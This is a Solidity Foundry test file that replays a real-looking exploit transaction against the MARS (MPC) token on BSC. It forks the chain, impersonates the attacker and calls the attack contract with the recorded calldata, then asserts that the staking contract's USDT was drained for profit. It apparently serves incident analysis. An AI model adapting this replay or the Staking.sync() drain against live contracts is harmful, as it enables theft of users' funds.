// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IMars {
    function presale() external view returns (bool);
    function tOwnedU(address account) external view returns (uint256);
    function uniswapV2Pair() external view returns (address);
}

contract MpcPoc is Test {
    // BSC addresses
    address constant MARS_ADDR = 0xA8b9c16E2A95d045254996281C7496112e80192E;
    address constant USDT_ADDR = 0x55d398326f99059fF775485246999027B3197955;
    address constant STAKING_ADDR = 0x550167A2C39F9d70A5DC98ABfA603bd4D1FAB12f;

    // Tx: https://bscscan.com/tx/0x0b8e54e0ab35f44f2ebf4ac3751bcf7b438c3f2be1477b60390eb3ef11ce3925
    address constant ATTACKER_EOA = 0x2524b98F1bF4F030A4524C7e2dDCCf2F61c5b9D4;
    address constant ATTACK_CONTRACT = 0x02c35D91Bf955040B986b00938D819EA9CA42235;

    uint256 constant TX_BLOCK = 71845321;
    uint256 constant FORK_BLOCK = TX_BLOCK - 1;
    uint256 constant TX_TIMESTAMP = 1765885879;

    // Observed from USDT Transfer(ATTACK_CONTRACT -> ATTACKER_EOA) in the tx receipt.
    uint256 constant EXPECTED_PROFIT_USDT = 1706736705590403346697;

    // Observed staking USDT balance at FORK_BLOCK (drained to 0 by the tx via Staking.sync()).
    uint256 constant STAKING_USDT_PRE = 13310826797185426593275;

    IERC20 public usdt = IERC20(USDT_ADDR);
    IMars public mars = IMars(MARS_ADDR);

    function setUp() public {
        string memory rpcUrl = vm.envOr(
            "BSC_RPC_URL",
            vm.envOr("RPC_URL", string(""))
        );
        require(
            bytes(rpcUrl).length != 0,
            "Set BSC_RPC_URL or RPC_URL to an archive node"
        );

        vm.createSelectFork(rpcUrl, FORK_BLOCK);

        vm.label(MARS_ADDR, "MARS(MPC)");
        vm.label(USDT_ADDR, "USDT");
        vm.label(STAKING_ADDR, "Staking");
        vm.label(ATTACKER_EOA, "AttackerEOA");
        vm.label(ATTACK_CONTRACT, "AttackContract");
        vm.label(mars.uniswapV2Pair(), "MPC-USDT Pair");
    }

    function testExploit() public {
        // Match the original tx block context.
        vm.roll(TX_BLOCK);
        vm.warp(TX_TIMESTAMP);

        // Sanity-check a few preconditions so we know we're forking the right state.
        assertTrue(mars.presale(), "presale should be true");
        assertEq(mars.tOwnedU(ATTACK_CONTRACT), 0, "tOwnedU prestate mismatch");
        assertEq(usdt.balanceOf(STAKING_ADDR), STAKING_USDT_PRE, "staking USDT prestate mismatch");

        uint256 beforeEoa = usdt.balanceOf(ATTACKER_EOA);
        vm.deal(ATTACKER_EOA, 1 ether);

        bytes memory txData =
            hex"b1848977"
            hex"00000000000000000000000055d398326f99059ff775485246999027b3197955"
            hex"0000000000000000000000001389928c3c00b5022804e1e62cf8963c71a22067"
            hex"000000000000000000000000550167a2c39f9d70a5dc98abfa603bd4d1fab12f"
            hex"0000000000000000000000000000000000000000000001b1ae4d6e2ef5000000"
            hex"000000000000000000000000000000000000000000000000000000000000000f"
            hex"000000000000000000000000a8b9c16e2a95d045254996281c7496112e80192e"
            hex"00000000000000000000000066ac34e40ca83f2420099cdc36b1ca70b2fbce54"
            hex"0000000000000000000000000000000000000000000000000000000000000007";

        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        (bool ok, ) = ATTACK_CONTRACT.call(txData);
        vm.stopPrank();

        assertTrue(ok, "replay reverted");

        uint256 afterEoa = usdt.balanceOf(ATTACKER_EOA);
        uint256 profit = afterEoa - beforeEoa;

        // The root cause of the profit comes from draining staking's USDT into the LP (Staking.sync()).
        assertEq(usdt.balanceOf(STAKING_ADDR), 0, "staking should be drained");
        assertEq(profit, EXPECTED_PROFIT_USDT, "profit mismatch");
    }
}
